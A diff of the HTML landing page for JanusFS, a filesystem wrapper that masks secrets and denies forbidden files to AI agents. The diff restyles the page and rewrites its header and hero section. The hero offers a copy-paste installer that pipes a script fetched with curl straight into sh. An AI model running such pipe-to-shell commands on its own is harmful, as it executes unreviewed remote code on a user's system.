@@ -1,763 +1,469 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>JanusFS — a policy-enforcing filesystem for AI agents</title>
-  <meta name="description" content="Sandboxes answer allow or deny. JanusFS adds the third answer — masked: a filtered virtual filesystem where allowed files pass through, secret spans are redacted byte-for-byte, and forbidden files fail closed. Kernel-enforced on Linux via janusfs exec." />
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230e0f12'/%3E%3Cpath d='M16 5v22' stroke='%23374151' stroke-width='1.5'/%3E%3Cpath d='M6 6h8v20H6z' fill='%232fbf87' opacity='0.85'/%3E%3Cpath d='M18 6h8v20h-8z' fill='%23e0a23a' opacity='0.85'/%3E%3Ctext x='22' y='22' font-family='monospace' font-size='13' fill='%230e0f12' font-weight='700'%3E*%3C/text%3E%3C/svg%3E" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JanusFS — a policy-enforcing filesystem for AI agents</title>
+<meta name="description" content="JanusFS is a filesystem wrapper for AI agents. Allowed files pass through, secret spans are masked byte-for-byte, forbidden files fail closed. Allow, deny — and the third answer: masked." />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="JanusFS — allow, deny, and the third answer: masked" />
+<meta property="og:description" content="A policy-enforcing filesystem for AI agents. Point it at a real project directory and it serves a filtered mirror — same paths, same sizes — deciding per read which face of each file to show." />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3CclipPath id='c'%3E%3Ccircle cx='16' cy='16' r='16'/%3E%3C/clipPath%3E%3Cg clip-path='url(%23c)'%3E%3Crect width='16' height='32' fill='%236BCB8B'/%3E%3Crect x='16' width='16' height='32' fill='%23E8B341'/%3E%3C/g%3E%3C/svg%3E" />
+<style>
+  @font-face { font-family: "Space Grotesk"; font-style: normal; font-weight: 400; font-display: swap; src: url("assets/fonts/space-grotesk-latin-400-normal.woff2") format("woff2"); }
+  @font-face { font-family: "Space Grotesk"; font-style: normal; font-weight: 500; font-display: swap; src: url("assets/fonts/space-grotesk-latin-500-normal.woff2") format("woff2"); }
+  @font-face { font-family: "Space Grotesk"; font-style: normal; font-weight: 600; font-display: swap; src: url("assets/fonts/space-grotesk-latin-600-normal.woff2") format("woff2"); }
+  @font-face { font-family: "Space Grotesk"; font-style: normal; font-weight: 700; font-display: swap; src: url("assets/fonts/space-grotesk-latin-700-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Sans"; font-style: normal; font-weight: 400; font-display: swap; src: url("assets/fonts/ibm-plex-sans-latin-400-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Sans"; font-style: normal; font-weight: 500; font-display: swap; src: url("assets/fonts/ibm-plex-sans-latin-500-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Sans"; font-style: normal; font-weight: 600; font-display: swap; src: url("assets/fonts/ibm-plex-sans-latin-600-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Mono"; font-style: normal; font-weight: 400; font-display: swap; src: url("assets/fonts/ibm-plex-mono-latin-400-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Mono"; font-style: normal; font-weight: 500; font-display: swap; src: url("assets/fonts/ibm-plex-mono-latin-500-normal.woff2") format("woff2"); }
+  @font-face { font-family: "IBM Plex Mono"; font-style: normal; font-weight: 600; font-display: swap; src: url("assets/fonts/ibm-plex-mono-latin-600-normal.woff2") format("woff2"); }
 
-  <meta property="og:type" content="website" />
-  <meta property="og:title" content="JanusFS — a policy-enforcing filesystem for AI agents" />
-  <meta property="og:description" content="The third answer between allow and deny: masked. Byte-for-byte redaction at the filesystem boundary, kernel-enforced on Linux." />
+  html { scroll-behavior: smooth; }
+  body { margin: 0; background: #0A0B0D; color: #E7E4DE; font-family: "IBM Plex Sans", system-ui, sans-serif; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+  * { box-sizing: border-box; }
+  a { color: #E8B341; text-decoration: none; }
+  a:hover { color: #F5CC6E; }
+  ::selection { background: #E8B341; color: #0A0B0D; }
+  @keyframes janusPulse { 0%,100% { opacity: .35 } 50% { opacity: 1 } }
 
-  <style>
-    /* ---------- brand fonts, self-hosted (no CDN) ----------
-       Geist = the human voice (prose, headlines).
-       Fira Code = the machine voice (paths, decisions, commands). */
-    @font-face { font-family: 'Geist'; font-style: normal; font-weight: 400; font-display: swap; src: url('assets/fonts/geist-sans-latin-400-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Geist'; font-style: normal; font-weight: 500; font-display: swap; src: url('assets/fonts/geist-sans-latin-500-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Geist'; font-style: normal; font-weight: 600; font-display: swap; src: url('assets/fonts/geist-sans-latin-600-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Geist'; font-style: normal; font-weight: 700; font-display: swap; src: url('assets/fonts/geist-sans-latin-700-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Fira Code'; font-style: normal; font-weight: 400; font-display: swap; src: url('assets/fonts/fira-code-latin-400-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Fira Code'; font-style: normal; font-weight: 500; font-display: swap; src: url('assets/fonts/fira-code-latin-500-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Fira Code'; font-style: normal; font-weight: 600; font-display: swap; src: url('assets/fonts/fira-code-latin-600-normal.woff2') format('woff2'); }
-    @font-face { font-family: 'Fira Code'; font-style: normal; font-weight: 700; font-display: swap; src: url('assets/fonts/fira-code-latin-700-normal.woff2') format('woff2'); }
-
-    :root {
-      --ink: #0a0b0d;
-      --ink-2: #0e0f12;
-      --panel: #1b1e24;
-      --panel-2: #15181d;
-      --line: rgba(255,255,255,0.16);
-      --line-soft: rgba(255,255,255,0.10);
-      --elev: 0 1px 0 rgba(255,255,255,0.05) inset, 0 10px 30px -20px rgba(0,0,0,0.85);
-      --paper: #f6f7f8;
-      --paper-2: #d7dade;
-      --muted: #9098a1;
-      --muted-2: #767d86;
-      --faint: #5b626b;
-
-      /* JanusFS's three decisions — used only to carry meaning */
-      --hidden:  oklch(0.66 0.20 18);   /* red    — fails closed (EACCES) */
-      --masked:  oklch(0.80 0.16 78);   /* amber  — redacted byte-for-byte */
-      --allowed: oklch(0.74 0.15 162);  /* green  — native passthrough */
-      --idle:    #6b727b;
-
-      --sans: 'Geist', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-      --mono: 'Fira Code', ui-monospace, 'SF Mono', SFMono-Regular, Menlo, Consolas, monospace;
-    }
-
-    * { box-sizing: border-box; }
-    html { scroll-behavior: smooth; }
-    body {
-      margin: 0;
-      background: var(--ink);
-      color: var(--paper-2);
-      font-family: var(--sans);
-      font-size: 16px;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
-    }
-    a { color: inherit; text-decoration: none; }
-    ::selection { background: oklch(0.74 0.15 162 / 0.35); color: #fff; }
-
-    .wrap { width: min(1120px, 100% - 44px); margin-inline: auto; }
-
-    h1, h2, h3 { color: var(--paper); font-weight: 620; line-height: 1.08; letter-spacing: -0.021em; margin: 0; }
-
-    .kicker { font-family: var(--mono); font-size: 12.5px; color: var(--muted); display: inline-flex; align-items: center; gap: 8px; margin: 0 0 18px; }
-    .kicker::before { content: ""; width: 7px; height: 7px; border-radius: 2px; background: var(--allowed); box-shadow: 0 0 0 3px oklch(0.74 0.15 162 / 0.14); }
-    h2 { font-size: clamp(26px, 3.4vw, 36px); }
-    .sub { color: var(--muted); font-size: 17px; max-width: 64ch; margin: 14px 0 0; }
-
-    code, kbd, pre, .mono { font-family: var(--mono); }
-
-    section { padding-block: clamp(64px, 9vw, 108px); border-top: 1px solid var(--line-soft); }
-
-    /* ---------------- top bar ---------------- */
-    header.bar { position: sticky; top: 0; z-index: 30; background: color-mix(in srgb, var(--ink) 84%, transparent); backdrop-filter: blur(14px) saturate(1.3); border-bottom: 1px solid var(--line-soft); }
-    .bar .wrap { display: flex; align-items: center; gap: 18px; height: 62px; }
-    .brand { display: flex; align-items: center; gap: 11px; }
-    .brand svg { width: 27px; height: 27px; border-radius: 7px; }
-    .brand b { font-family: var(--mono); font-weight: 600; color: var(--paper); font-size: 15px; letter-spacing: -0.01em; }
-    .bar nav { margin-left: auto; display: flex; align-items: center; gap: 28px; }
-    .bar nav a { color: var(--muted); font-size: 14px; transition: color .15s; }
-    .bar nav a:hover { color: var(--paper); }
-    @media (max-width: 820px) { .bar nav a.opt { display: none; } }
-
-    /* ---------------- buttons ---------------- */
-    .btn { display: inline-flex; align-items: center; gap: 9px; padding: 11px 19px; border-radius: 11px; font-size: 14.5px; font-weight: 560; border: 1px solid var(--line); color: var(--paper); background: rgba(255,255,255,0.03); transition: background .16s, border-color .16s, transform .16s; }
-    .btn:hover { background: rgba(255,255,255,0.07); border-color: rgba(255,255,255,0.22); }
-    .btn:active { transform: translateY(1px); }
-    .btn.solid { background: var(--paper); color: #0a0a0a; border-color: var(--paper); font-weight: 600; }
-    .btn.solid:hover { background: #fff; }
-    :focus-visible { outline: 2px solid var(--allowed); outline-offset: 2px; border-radius: 6px; }
-
-    /* ---------------- command line ---------------- */
-    .cmd { display: flex; align-items: center; gap: 12px; background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 13px 14px 13px 16px; font-family: var(--mono); font-size: 13.5px; color: var(--paper-2); }
-    .cmd .p { color: var(--allowed); user-select: none; font-weight: 600; }
-    .cmd code { flex: 1; min-width: 0; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
-    .cmd code::-webkit-scrollbar { display: none; }
-    .copy { cursor: pointer; flex-shrink: 0; border: 1px solid var(--line); background: rgba(255,255,255,0.04); color: var(--muted); border-radius: 8px; padding: 6px 11px; font: 500 12px var(--sans); transition: color .15s, background .15s, border-color .15s; }
-    .copy:hover { color: var(--paper); background: rgba(255,255,255,0.09); }
-    .copy.ok { color: var(--allowed); border-color: oklch(0.74 0.15 162 / 0.5); }
-
-    /* ================= HERO ================= */
-    .hero { padding-top: clamp(56px, 8vw, 96px); padding-bottom: clamp(48px, 7vw, 84px); position: relative; overflow: hidden; }
-    .hero::before { content: ""; position: absolute; inset: -30% -10% auto auto; width: 720px; height: 720px; background: radial-gradient(circle at 70% 30%, oklch(0.80 0.16 78 / 0.14), transparent 60%); filter: blur(20px); pointer-events: none; z-index: 0; }
-    .hero .wrap { position: relative; z-index: 1; display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(0, 0.95fr); gap: clamp(28px, 5vw, 64px); align-items: center; }
-    .hero h1 { font-size: clamp(34px, 5.4vw, 60px); font-weight: 680; letter-spacing: -0.03em; }
-    .hero h1 .machine { font-family: var(--mono); font-weight: 600; letter-spacing: -0.04em; }
-    .hero p.pitch { color: var(--muted); font-size: clamp(16.5px, 1.7vw, 19px); max-width: 46ch; margin: 22px 0 30px; }
-    .hero p.pitch strong { color: var(--paper-2); font-weight: 560; }
-    .actions { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; }
-    .installline { margin-top: 26px; max-width: 560px; }
-    .installline .hint { font-family: var(--mono); font-size: 11.5px; color: var(--faint); margin: 10px 2px 0; }
-    .installline .hint a { color: var(--muted); text-decoration: underline; text-underline-offset: 3px; text-decoration-color: var(--line); }
-    .installline .hint a:hover { color: var(--paper); text-decoration-color: var(--paper); }
-    @media (max-width: 900px) { .hero .wrap { grid-template-columns: minmax(0, 1fr); } .hero::before { width: 480px; height: 480px; } }
-
-    /* ---- the characteristic artifact: one source tree, one agent's view ---- */
-    .view { background: linear-gradient(180deg, var(--panel), var(--panel-2)); border: 1px solid var(--line); border-radius: 16px; box-shadow: 0 40px 80px -40px rgba(0,0,0,0.8); overflow: hidden; }
-    .view-top { display: flex; align-items: center; gap: 8px; padding: 12px 15px; border-bottom: 1px solid var(--line-soft); font-family: var(--mono); font-size: 12px; color: var(--muted); }
-    .view-top .tl { display: flex; gap: 6px; margin-right: 6px; }
-    .view-top .tl i { width: 10px; height: 10px; border-radius: 50%; background: #2a2d33; }
-    .view-top .count { margin-left: auto; color: var(--faint); }
-    .row { display: grid; grid-template-columns: 18px minmax(0, 1fr) auto; align-items: center; gap: 12px; padding: 11px 16px; border-bottom: 1px solid var(--line-soft); font-family: var(--mono); }
-    .row .g { font-size: 12px; text-align: center; line-height: 1; }
-    .row .name { display: block; color: var(--paper); font-size: 13px; font-weight: 500; }
-    .row .desc { display: block; color: var(--muted-2); font-size: 11px; margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .row .tag { font-size: 10px; font-weight: 600; padding: 3px 8px; border-radius: 6px; letter-spacing: 0.02em; text-transform: uppercase; }
-    .s-hidden  .g, .s-hidden  .tag { color: var(--hidden); }
-    .s-hidden  { background: linear-gradient(90deg, oklch(0.66 0.20 18 / 0.09), transparent 70%); }
-    .s-hidden  .tag { background: oklch(0.66 0.20 18 / 0.14); }
-    .s-masked  .g, .s-masked  .tag { color: var(--masked); }
-    .s-masked  .tag { background: oklch(0.80 0.16 78 / 0.14); }
-    .s-allowed .g, .s-allowed .tag { color: var(--allowed); }
-    .s-allowed .tag { background: oklch(0.74 0.15 162 / 0.14); }
-    .view-cat { padding: 14px 16px; font-family: var(--mono); font-size: 12.5px; color: var(--paper-2); background: var(--panel-2); border-top: 1px solid var(--line-soft); }
-    .view-cat .p { color: var(--allowed); }
-    .view-cat .mask { color: var(--masked); }
-    .view-cat .deny { color: var(--hidden); }
-    .view-cat .c { color: var(--faint); }
-    .view-cat div { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
-
-    /* ================= decisions legend / mental model ================= */
-    .legend { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 26px; }
-    .chip { display: inline-flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 12.5px; color: var(--muted); border: 1px solid var(--line-soft); background: var(--panel-2); padding: 7px 12px; border-radius: 9px; }
-    .chip i { width: 8px; height: 8px; border-radius: 2px; }
-    .chip.h i { background: var(--hidden); } .chip.m i { background: var(--masked); } .chip.a i { background: var(--allowed); }
-
-    .flow { margin-top: 34px; display: grid; grid-template-columns: 1fr auto 1fr auto 1fr auto 1fr; gap: 0; align-items: stretch; border: 1px solid var(--line); border-radius: 14px; overflow: hidden; background: var(--panel-2); font-family: var(--mono); }
-    .flow .node { padding: 20px 20px; }
-    .flow .node b { display: block; color: var(--paper); font-size: 13.5px; font-weight: 600; }
-    .flow .node span { display: block; color: var(--muted-2); font-size: 11px; margin-top: 6px; line-height: 1.5; }
-    .flow .link { display: grid; place-items: center; padding: 0 4px; color: var(--faint); font-size: 18px; background: rgba(255,255,255,0.02); border-inline: 1px solid var(--line-soft); }
-    @media (max-width: 820px) { .flow { grid-template-columns: 1fr; } .flow .link { padding: 8px; border-inline: none; border-block: 1px solid var(--line-soft); transform: rotate(90deg); } }
-
-    /* ================= capabilities: bento ================= */
-    .bento { margin-top: 40px; display: grid; grid-template-columns: repeat(6, minmax(0, 1fr)); gap: 14px; }
-    .cell { min-width: 0; background: var(--panel); border: 1px solid var(--line); border-radius: 14px; padding: 24px; box-shadow: var(--elev); }
-    .cell h3 { font-size: 17px; }
-    .cell p { color: var(--muted); font-size: 14.5px; margin: 9px 0 0; }
-    .cell code { color: var(--paper-2); font-size: 0.86em; background: rgba(255,255,255,0.05); padding: 1px 5px; border-radius: 5px; font-family: var(--mono); }
-    .cell .lead { font-family: var(--mono); font-size: 12px; color: var(--muted-2); margin-bottom: 10px; }
-    .cell.hero-cell { grid-column: span 3; grid-row: span 2; display: flex; flex-direction: column; justify-content: space-between; background: linear-gradient(165deg, var(--panel), var(--panel-2)); }
-    .cell.hero-cell h3 { font-size: 21px; }
-    .cell.wide { grid-column: span 3; }
-    .cell.third { grid-column: span 2; }
-    .miniview { margin-top: 22px; display: grid; gap: 7px; }
-    .miniview div { display: flex; align-items: center; gap: 10px; font-family: var(--mono); font-size: 12px; color: var(--muted); }
-    .miniview i { width: 7px; height: 7px; border-radius: 2px; }
-    @media (max-width: 900px) { .bento { grid-template-columns: repeat(2, minmax(0, 1fr)); } .cell.hero-cell, .cell.wide, .cell.third { grid-column: span 2; grid-row: auto; } }
-    @media (max-width: 560px) { .bento { grid-template-columns: minmax(0, 1fr); } .cell.hero-cell, .cell.wide, .cell.third { grid-column: span 1; } }
-
-    /* ================= why: the two-answer dilemma ================= */
-    .dilemma { margin-top: 40px; display: grid; grid-template-columns: 1fr 1fr 1.18fr; gap: 16px; align-items: stretch; }
-    @media (max-width: 900px) { .dilemma { grid-template-columns: minmax(0, 1fr); } }
-    .door { min-width: 0; position: relative; display: flex; flex-direction: column; border: 1px solid var(--line); border-radius: 16px; padding: 26px; background: var(--panel); box-shadow: var(--elev); }
-    .door .lead { font-family: var(--mono); font-size: 12px; letter-spacing: 0.03em; text-transform: uppercase; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 14px; color: var(--muted-2); }
-    .door h3 { font-size: 19px; margin-bottom: 9px; }
-    .door p { color: var(--muted); font-size: 14px; margin: 0; }
-    .door p code { color: var(--paper-2); font-size: 0.86em; background: rgba(255,255,255,0.05); padding: 1px 5px; border-radius: 5px; font-family: var(--mono); }
-    .door .verdict { margin-top: auto; padding-top: 20px; font-family: var(--mono); font-size: 13px; display: inline-flex; align-items: center; gap: 9px; }
-    .door.bad { background: linear-gradient(180deg, oklch(0.66 0.20 18 / 0.055), var(--panel)); }
-    .door.bad .lead, .door.bad .verdict { color: var(--hidden); }
-    .door.win { background: linear-gradient(165deg, oklch(0.74 0.15 162 / 0.11), var(--panel-2)); border-color: oklch(0.74 0.15 162 / 0.42); }
-    .door.win .lead, .door.win .verdict { color: var(--allowed); }
-
-    /* ================= three faces table + config ================= */
-    .split { margin-top: 38px; display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 16px; align-items: start; }
-    @media (max-width: 860px) { .split { grid-template-columns: minmax(0, 1fr); } }
-    .compare { border: 1px solid var(--line); border-radius: 14px; overflow: hidden; box-shadow: var(--elev); }
-    .compare .scroll { overflow-x: auto; }
-    table { width: 100%; border-collapse: collapse; font-size: 13.5px; min-width: 420px; }
-    th, td { text-align: left; padding: 13px 16px; border-bottom: 1px solid var(--line-soft); }
-    thead th { color: var(--paper); font-weight: 600; background: rgba(255,255,255,0.03); font-family: var(--mono); font-size: 12px; }
-    tbody tr:last-child td { border-bottom: none; }
-    td:first-child { color: var(--paper-2); font-family: var(--mono); font-weight: 600; }
-    td .h { color: var(--hidden); } td .m { color: var(--masked); } td .a { color: var(--allowed); }
-    .yes { color: var(--allowed); font-family: var(--mono); font-weight: 600; }
-    .no  { color: var(--hidden); font-family: var(--mono); font-weight: 600; }
-    .part { color: var(--masked); font-family: var(--mono); font-size: 12px; }
-
-    pre.code { min-width: 0; background: var(--panel-2); border: 1px solid var(--line-soft); border-radius: 14px; padding: 18px 20px; overflow-x: auto; font-family: var(--mono); font-size: 12.5px; line-height: 1.7; color: var(--paper-2); margin: 0; }
-    pre.code .c { color: var(--faint); }
-    pre.code .k { color: var(--allowed); }
-    pre.code .key { color: var(--masked); }
-
-    .callout { margin-top: 22px; border: 1px solid var(--line); border-left: 3px solid var(--masked); background: var(--panel-2); border-radius: 0 12px 12px 0; padding: 16px 20px; color: var(--muted); font-size: 14.5px; }
-    .callout b { color: var(--paper); }
-    .callout a { color: var(--paper-2); text-decoration: underline; text-underline-offset: 3px; text-decoration-color: var(--faint); }
-    .callout code { font-family: var(--mono); color: var(--paper-2); }
-    .callout.danger { border-left-color: var(--hidden); }
-
-    /* ================= install ================= */
-    .steps { margin-top: 38px; display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 18px; }
-    @media (max-width: 780px) { .steps { grid-template-columns: minmax(0, 1fr); } }
-    .step { min-width: 0; background: var(--panel); border: 1px solid var(--line); border-radius: 14px; padding: 22px; box-shadow: var(--elev); }
-    .step h3 { font-size: 15px; display: flex; align-items: center; gap: 11px; margin-bottom: 14px; }
-    .step .n { flex-shrink: 0; display: inline-grid; place-items: center; width: 26px; height: 26px; border-radius: 8px; background: rgba(255,255,255,0.05); border: 1px solid var(--line); font: 600 13px var(--mono); color: var(--paper); }
-    .step p { color: var(--muted); font-size: 13.5px; margin: 0 0 14px; }
-
-    /* ================= layout / packages ================= */
-    .files { margin-top: 34px; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
-    @media (max-width: 780px) { .files { grid-template-columns: minmax(0, 1fr); } }
-    .file { min-width: 0; background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 17px 19px; box-shadow: var(--elev); }
-    .file b { font-family: var(--mono); color: var(--paper); font-size: 13.5px; font-weight: 600; }
-    .file p { margin: 7px 0 0; color: var(--muted-2); font-size: 13px; }
-
-    /* ================= closing CTA ================= */
-    .finale { border-top: 1px solid var(--line); background: radial-gradient(120% 140% at 50% 0%, rgba(255,255,255,0.035), transparent 60%); }
-    .finale .wrap { max-width: 720px; display: flex; flex-direction: column; align-items: center; text-align: center; }
-    .finale h2 { font-size: clamp(28px, 4.2vw, 42px); }
-    .finale > .wrap > p { color: var(--muted); font-size: 17px; max-width: 56ch; margin: 16px 0 0; }
-    .finale .cmd { margin-top: 30px; width: 100%; max-width: 660px; }
-    .finale .note { font-family: var(--mono); font-size: 12px; color: var(--faint); margin-top: 16px; }
-    .finale .note a { color: var(--muted); text-decoration: underline; text-underline-offset: 3px; text-decoration-color: var(--line); }
-    .finale .note a:hover { color: var(--paper); text-decoration-color: var(--paper); }
-
-    /* ================= footer ================= */
-    footer { border-top: 1px solid var(--line-soft); padding: 48px 0 72px; }
-    footer .wrap { display: grid; grid-template-columns: 1.2fr 1fr 1fr; gap: 32px; }
-    @media (max-width: 700px) { footer .wrap { grid-template-columns: 1fr; gap: 26px; } }
-    footer .who b { font-family: var(--mono); color: var(--paper); font-size: 15px; }
-    footer .who p { color: var(--muted-2); font-size: 13.5px; margin: 10px 0 0; max-width: 44ch; }
-    footer .col h4 { font-family: var(--mono); color: var(--muted); font-size: 12px; font-weight: 500; margin: 0 0 12px; }
-    footer .col a { display: block; color: var(--paper-2); font-size: 14px; padding: 5px 0; transition: color .15s; }
-    footer .col a:hover { color: #fff; }
-
-    kbd { font-family: var(--mono); background: rgba(255,255,255,0.05); border: 1px solid var(--line); border-bottom-width: 2px; border-radius: 5px; padding: 1px 6px; font-size: 12px; color: var(--paper-2); }
-  </style>
+  .nav-link { color: #9A968E; transition: color .15s; }
+  .nav-link:hover { color: #E7E4DE; }
+  .btn-gh { transition: border-color .15s, color .15s; }
+  .btn-gh:hover { border-color: #E8B341; color: #E8B341; }
+  .btn-primary { transition: background .15s; }
+  .btn-primary:hover { background: #F5CC6E; }
+  .btn-ghost { transition: border-color .15s; }
+  .btn-ghost:hover { border-color: #4A4F58; }
+  .copy-btn { transition: color .15s, border-color .15s; }
+  .copy-btn:hover { color: #E8B341; border-color: #E8B341; }
+  .file-row { transition: background .12s; }
+  .file-row:hover { background: #14171B !important; }
+  .use-card { transition: border-color .15s; }
+  .use-card:hover { border-color: #3A3220; }
+</style>
 </head>
 <body>
-  <a id="top"></a>
+<div style="background:#0A0B0D;color:#E7E4DE;font-family:'IBM Plex Sans',system-ui,sans-serif">
 
-  <!-- ===================== BAR ===================== -->
-  <header class="bar">
-    <div class="wrap">
-      <a class="brand" href="#top" aria-label="JanusFS home">
-        <svg viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#0e0f12"/><rect x="6" y="6" width="8" height="20" fill="#2fbf87" opacity="0.85"/><rect x="18" y="6" width="8" height="20" fill="#e0a23a" opacity="0.85"/><path d="M16 5v22" stroke="#374151" stroke-width="1.5"/></svg>
-        <b>janusfs</b>
+  <header style="position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(10,11,13,.82);border-bottom:1px solid #1C1F24">
+    <div style="max-width:1180px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;gap:28px">
+      <a href="#top" style="font-family:'IBM Plex Mono',monospace;font-weight:600;font-size:15px;color:#E7E4DE;letter-spacing:-.01em;display:flex;align-items:center;gap:9px">
+        <span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(90deg,#6BCB8B 0 50%,#E8B341 50% 100%);display:inline-block"></span>janusfs
       </a>
-      <nav>
-        <a class="opt" href="#why">Why</a>
-        <a class="opt" href="#model">Model</a>
-        <a class="opt" href="#does">Does</a>
-        <a class="opt" href="#uses">Uses</a>
-        <a class="opt" href="#enforce">Enforce</a>
-        <a class="opt" href="#faces">Faces</a>
-        <a href="#install">Install</a>
-        <a href="https://github.com/sarathsp06/janusfs">GitHub</a>
+      <nav style="display:flex;gap:22px;margin-left:auto;align-items:center;flex-wrap:wrap;font-size:13.5px">
+        <a class="nav-link" href="#why">Why</a>
+        <a class="nav-link" href="#faces">Three faces</a>
+        <a class="nav-link" href="#uses">Use cases</a>
+        <a class="nav-link" href="#compare">Compare</a>
+        <a class="nav-link" href="#install">Install</a>
+        <a class="btn-gh" href="https://github.com/sarathsp06/janusfs" style="padding:8px 14px;border:1px solid #2A2E35;border-radius:8px;color:#E7E4DE;font-weight:500">GitHub &#8599;</a>
       </nav>
     </div>
   </header>
 
-  <!-- ===================== HERO ===================== -->
-  <div class="hero">
-    <div class="wrap">
+  <section id="top" style="max-width:1180px;margin:0 auto;padding:clamp(48px,8vw,104px) 24px 0">
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,420px),1fr));gap:clamp(36px,5vw,64px);align-items:start">
       <div>
-        <h1>Allow. Deny.<br />And the third answer: <span class="machine">masked</span>.</h1>
-        <p class="pitch">
-          JanusFS is a <strong>filesystem wrapper for AI agents</strong>. Point it at a real project
-          directory and it serves a <strong>filtered mirror of the same tree</strong> — same paths, same
-          file sizes — deciding <em>per read</em> which face of each file to show. Allowed files pass through
-          untouched, secret spans are redacted <strong>byte-for-byte</strong>, and forbidden files fail closed.
-          Run <code style="font-family:var(--mono);color:var(--paper-2)">janusfs exec -- your-agent</code> and the
-          whole process tree lives inside that mirror — kernel-enforced on Linux.
+        <div style="display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:#E8B341;border:1px solid #3A3220;background:#17140D;padding:6px 11px;border-radius:999px">
+          <span style="width:6px;height:6px;border-radius:50%;background:#E8B341;animation:janusPulse 2.4s ease-in-out infinite"></span>a policy-enforcing filesystem for AI agents
+        </div>
+        <h1 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(40px,6.4vw,74px);line-height:1.02;letter-spacing:-.035em;margin:24px 0 0;text-wrap:balance">
+          <span style="color:#6BCB8B">Allow.</span> <span style="color:#E2564B">Deny.</span><br />
+          And the third answer: <span style="color:#E8B341;position:relative;white-space:nowrap">masked<span style="position:absolute;left:0;right:0;bottom:.1em;height:.09em;background:#E8B341;opacity:.35;display:block"></span></span>
+        </h1>
+        <p style="font-size:clamp(16.5px,1.6vw,19px);line-height:1.6;color:#A8A49C;margin:26px 0 0;max-width:56ch;text-wrap:pretty">
+          JanusFS is a <strong style="color:#E7E4DE;font-weight:600">filesystem wrapper for AI agents</strong>. Point it at a real project directory and it serves a <strong style="color:#E7E4DE;font-weight:600">filtered mirror of the same tree</strong> — same paths, same file sizes — deciding <em>per read</em> which face of each file to show. Allowed files pass through untouched, secret spans are redacted <strong style="color:#E7E4DE;font-weight:600">byte-for-byte</strong>, and forbidden files fail closed.
         </p>
-        <div class="actions">
-          <a class="btn solid" href="#install">Install</a>
-          <a class="btn" href="https://github.com/sarathsp06/janusfs">Read the source</a>
+        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:30px">
+          <a class="btn-primary" href="#install" style="padding:13px 22px;border-radius:9px;background:#E8B341;color:#0A0B0D;font-weight:600;font-size:15px">Install</a>
+          <a class="btn-ghost" href="https://github.com/sarathsp06/janusfs" style="padding:13px 22px;border-radius:9px;border:1px solid #2A2E35;color:#E7E4DE;font-weight:500;font-size:15px">Read the source</a>
         </div>
-        <div class="installline">
-          <div class="cmd">
-            <span class="p">$</span>
-            <code id="cmd-hero">curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh</code>
-            <button class="copy" data-copy="cmd-hero">Copy</button>
+        <div style="margin-top:26px;display:flex;align-items:center;gap:10px;background:#101216;border:1px solid #1C1F24;border-radius:10px;padding:12px 14px;max-width:640px;overflow:hidden">
+          <span style="font-family:'IBM Plex Mono',monospace;color:#6BCB8B;font-size:13px">$</span>
+          <code style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#C9C5BD;white-space:pre-wrap;word-break:break-all;line-height:1.55;flex:1">curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh</code>
+          <button class="copy-btn" type="button" style="flex:none;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.08em;text-transform:uppercase;padding:6px 10px;border-radius:6px;border:1px solid #2A2E35;background:transparent;color:#9A968E;cursor:pointer">copy</button>
+        </div>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#6F6B64;margin:12px 0 0">one static binary · Linux amd64 &amp; arm64 · no cgo · <a href="https://github.com/sarathsp06/janusfs#quickstart">all install methods &#8594;</a></p>
+      </div>
+
